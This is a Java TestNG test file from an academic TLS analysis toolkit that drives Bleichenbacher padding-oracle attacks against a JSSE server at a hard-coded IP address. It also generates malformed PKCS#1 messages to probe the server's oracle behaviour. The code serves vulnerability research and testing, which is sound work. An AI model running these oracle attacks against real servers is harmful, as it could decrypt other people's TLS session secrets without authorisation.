package de.rub.nds.ssl.analyzer.attacks;

import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
import de.rub.nds.ssl.analyzer.attacker.BleichenbacherCrypto12;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.JSSE16Oracle;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.SocketException;
import java.security.InvalidKeyException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Security;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.util.Arrays;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;

/**
 * Performs the Bleichenbacher Tests (original/optimized) against a vulnerable
 * server.
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * Feb 8, 2013
 */
public class BleichenbacherJSSETest {

    /**
     * Plain PKCS message
     */
    private static final byte[] plainPKCS = new byte[]{
        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
        (byte) 0x9b, (byte) 0xf5, (byte) 0xc3, (byte) 0xc3, (byte) 0xaf,
        (byte) 0x7f, (byte) 0x6d, (byte) 0xa1, (byte) 0xe5, (byte) 0xfd,
        (byte) 0x3d, (byte) 0x93, (byte) 0xbb, (byte) 0x29, (byte) 0x11,
        (byte) 0x9b, (byte) 0x59, (byte) 0x5f, (byte) 0x11, (byte) 0x17,
        (byte) 0x17, (byte) 0xaf, (byte) 0x71, (byte) 0x33, (byte) 0xd7,
        (byte) 0x3f, (byte) 0x1b, (byte) 0x2f, (byte) 0x2b, (byte) 0xcd,
        (byte) 0x77, (byte) 0xfd, (byte) 0x3f, (byte) 0x5d, (byte) 0x67,
        (byte) 0x3b, (byte) 0x8f, (byte) 0xcd, (byte) 0xc5, (byte) 0x07,
        (byte) 0x6f, (byte) 0x59, (byte) 0x2b, (byte) 0xa7, (byte) 0x0d,
        (byte) 0xd3, (byte) 0x93, (byte) 0x87, (byte) 0x8d, (byte) 0x25,
        (byte) 0x47, (byte) 0x3b, (byte) 0xf7, (byte) 0x2d, (byte) 0xf9,
        (byte) 0x69, (byte) 0xdd, (byte) 0xe5, (byte) 0x85, (byte) 0x79,
        (byte) 0x7d, (byte) 0xc9, (byte) 0x09, (byte) 0xb7, (byte) 0xb7,
        (byte) 0x3d, (byte) 0x07, (byte) 0x23, (byte) 0x25, (byte) 0x07,
        (byte) 0x71, (byte) 0xb9, (byte) 0x1b, (byte) 0xcf, (byte) 0x15,
        (byte) 0x99, (byte) 0xdf, (byte) 0xb5, (byte) 0x6b, (byte) 0x29,
        (byte) 0x21, (byte) 0x4d, (byte) 0x4b, (byte) 0xf5, (byte) 0x31,
        (byte) 0x37, (byte) 0x9b, (byte) 0x43, (byte) 0x89, (byte) 0xd9,
        (byte) 0xef, (byte) 0x81, (byte) 0x55, (byte) 0x61, (byte) 0x4f,
        (byte) 0xc9, (byte) 0xff, (byte) 0xcf, (byte) 0x49, (byte) 0x73,
        (byte) 0xa9, (byte) 0x7f, (byte) 0xcb, (byte) 0xb5, (byte) 0x4f,
        (byte) 0x9d, (byte) 0xa5, (byte) 0xc9, (byte) 0x97, (byte) 0x3d,
        (byte) 0x9b, (byte) 0xf1, (byte) 0x9f, (byte) 0xf1, (byte) 0x95,
        (byte) 0xf9, (byte) 0x07, (byte) 0xa7, (byte) 0x95, (byte) 0xd5,
        (byte) 0xef, (byte) 0xd3, (byte) 0x4b, (byte) 0x27, (byte) 0x1f,
        (byte) 0x1f, (byte) 0x27, (byte) 0x9f, (byte) 0x5d, (byte) 0x8f,
        (byte) 0x39, (byte) 0x1b, (byte) 0x00, (byte) 0x03, (byte) 0x01,
        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
        (byte) 0x40};
    private PrivateKey privateKey;
    private PublicKey publicKey;
    private Cipher cipher;
    private byte[] encPMS;
    /**
     * Log4j logger initialization.
     */
    private static Logger logger = Logger.getRootLogger();

    private static KeyStore loadKeyStore(final String keyStorePath,
            final String keyStorePassword) throws KeyStoreException, IOException,
            NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(new FileInputStream(keyStorePath), keyStorePassword.
                toCharArray());

        return ks;
    }

    private static byte[] encryptHelper(final byte[] msg,
            final PublicKey publicKey) {
        byte[] result = null;
        try {
            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            result = cipher.doFinal(msg);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IllegalBlockSizeException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (BadPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        }

        return result;
    }

    @Test(enabled = false, priority = 1)
    public void standardBleichenbacher() throws SocketException,
            OracleException {
        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);

        Bleichenbacher attacker = new Bleichenbacher(encPMS,
                jsseOracle, true);
        attacker.attack();
    }

    @Test(enabled = false, priority = 2)
    public void optimizedBleichenbacher() throws SocketException,
            OracleException {
        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);

        BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(encPMS,
                jsseOracle, true);
        attacker.attack();
    }

    @Test(enabled = false, priority = 2)
    public void sslTriggerOracleTest() throws SocketException,
            OracleException {
        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 55443);

        byte[][] test;
        byte[] enc;

        int counter = 0;

        //test invalid PKCS1 messages
        test = getInvalidPKCS1messages();
        for (int i = 0; i < test.length; i++) {
            enc = encryptHelper(test[i], publicKey);
            jsseOracle.checkPKCSConformity(enc);
            counter++;
        }

        test = getInvalidPMSlength();
        for (int i = 0; i < test.length; i++) {
            enc = encryptHelper(test[i], publicKey);
            jsseOracle.checkPKCSConformity(enc);
            counter++;
        }

        test = getInvalidPMSlength2();
        for (int i = 0; i < test.length; i++) {
            enc = encryptHelper(test[i], publicKey);
            jsseOracle.checkPKCSConformity(enc);
            counter++;
        }

        // invalid ssl version number (explicitly taken 128, 129 and 255 to 
        // produce a "byte converstion overflow")
        int[] x = {0, 1, 2, 3, 4, 128, 129, 255};
        for (int i = 0; i < x.length; i++) {
            plainPKCS[plainPKCS.length - 48] = (byte) x[i];
            enc = encryptHelper(plainPKCS, publicKey);
            jsseOracle.checkPKCSConformity(enc);
            counter++;
        }

        // valid
        enc = encryptHelper(plainPKCS, publicKey);
        jsseOracle.checkPKCSConformity(enc);
        counter++;


        System.out.println("counter: " + counter);
    }

    /**
     *
     * @return invalid PKCS1 messages
     */
    private byte[][] getInvalidPKCS1messages() {
        byte[][] invalidPKCS1messages = new byte[10][plainPKCS.length];
        for (int i = 0; i < 9; i++) {
            invalidPKCS1messages[i] = Arrays.copyOf(plainPKCS, plainPKCS.length);
        }
        // set the second byte to 0x01 (should be 0x02)
        invalidPKCS1messages[0][1] = 0x01;
        // set the second byte to 0x00 (should be 0x02)
        invalidPKCS1messages[1][1] = 0x00;

        for (int i = 2; i < 10; i++) {
            invalidPKCS1messages[i][i] = 0x00;
        }
        return invalidPKCS1messages;
    }

    /**
     *
     * @return invalid pms length messages (0x00 at a wrong position)
     */
    private byte[][] getInvalidPMSlength() {
        // invalid 0x00 positions computed as:
        //   pkcs - 10 (10 leading bytes) - 49 (48-byte PMS + 0x0 byte)
        int x = plainPKCS.length - 59;
        byte[][] invalidPMSlengthMessages = new byte[x][plainPKCS.length];
        for (int i = 0; i < x; i++) {
            invalidPMSlengthMessages[i] =
                    Arrays.copyOf(plainPKCS, plainPKCS.length);
            invalidPMSlengthMessages[i][10 + i] = 0x00;
        }
        return invalidPMSlengthMessages;
    }

    /**
     *
     * @return invalid pms length messages (0x00 at a wrong position in the pms
     * area)
     */
    private byte[][] getInvalidPMSlength2() {
        // 49 invalid messages
        byte[] current = Arrays.copyOf(plainPKCS, plainPKCS.length);
        for (int i = 0; i < 49; i++) {
            current[plainPKCS.length - i - 1] = 0x01;
        }
        byte[][] invalidPMSlengthMessages = new byte[49][plainPKCS.length];
        invalidPMSlengthMessages[0] = current.clone();
        for (int i = 1; i < 49; i++) {
            invalidPMSlengthMessages[i] =
                    Arrays.copyOf(current, plainPKCS.length);
            invalidPMSlengthMessages[i][plainPKCS.length - i] = 0x00;
        }
        return invalidPMSlengthMessages;
    }

    @BeforeMethod
    protected void printMethodBanner(Method method) throws Exception {
        String testName = method.getName();
        logger.info("++++Start Test (" + testName + ")++++");
    }

    @AfterMethod
    protected void printEndOfMethodBanner(Method method) throws Exception {
        String testName = method.getName();
        logger.info("++++End of Test (" + testName + ")++++");
        logger.info("------------------------------");
    }

    /**
     * Initialize logging properties and the 2048 bit long key
     */
    @BeforeClass
    public void setUpClass() {
        PropertyConfigurator.configure("logging.properties");
        logger.info("##################################1");
        logger.info(this.getClass().getSimpleName());
        logger.info("##################################");
        Security.addProvider(new BouncyCastleProvider());

        try {
            String keyName = "2048_rsa";
            String keyPassword = "password";
            KeyStore ks = loadKeyStore("server.jks", "password");
            publicKey = ks.getCertificate(keyName).getPublicKey();
            privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
                    toCharArray());

            encPMS = encryptHelper(plainPKCS, publicKey);
        } catch (UnrecoverableKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (KeyStoreException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (CertificateException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        }
    }
}
